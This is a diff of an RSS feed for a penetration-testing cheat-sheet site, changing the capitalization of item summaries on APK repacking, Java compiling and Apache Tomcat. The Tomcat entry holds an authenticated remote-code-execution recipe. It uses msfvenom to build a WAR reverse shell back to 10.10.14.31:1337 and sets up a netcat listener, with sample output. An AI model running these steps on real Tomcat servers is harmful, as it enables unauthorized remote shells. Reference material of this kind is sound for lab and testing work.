@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/android/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/android/</guid>
-      <description>Unpack .apk file # Get .smali files java -jar apktool_2.9.3.jar d &amp;lt;FILE&amp;gt; # Get .java files jadx &amp;lt;FILE&amp;gt; Ref: apktool Ref: jadx&#xA;Re-pack .apk file 1. Initial pack java -jar apktool_2.9.3.jar b --use-aapt2 &amp;lt;APP&amp;gt; -o &amp;lt;APP&amp;gt;_repacked.apk 2. zip align zipalign&#xA;3. Sign the apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --out &amp;lt;APP&amp;gt;_final.apk &amp;lt;APP&amp;gt;_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.</description>
+      <description>Unpack .apk File # Get .smali files java -jar apktool_2.9.3.jar d &amp;lt;FILE&amp;gt; # Get .java files jadx &amp;lt;FILE&amp;gt; Ref: apktool Ref: jadx&#xA;Re-pack .apk File 1. Initial Pack java -jar apktool_2.9.3.jar b --use-aapt2 &amp;lt;APP&amp;gt; -o &amp;lt;APP&amp;gt;_repacked.apk 2. Zip Align zipalign&#xA;3. Sign the Apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --out &amp;lt;APP&amp;gt;_final.apk &amp;lt;APP&amp;gt;_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.</description>
     </item>
     <item>
       <title>Apache Tomcat</title>
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.</description>
+      <description>Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR File msfvenom -p java/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a Listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.</description>
     </item>
     <item>
       <title>Java</title>
       <link>https://tldrbins.github.io/java/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/java/</guid>
-      <description>Java Decompile JAR jd-gui Ref: Download jd-gui&#xA;Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ . </description>
+      <description>Decompile JAR jd-gui Ref: Download jd-gui&#xA;Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ . </description>
     </item>
     <item>
       <title>Java Environment</title>
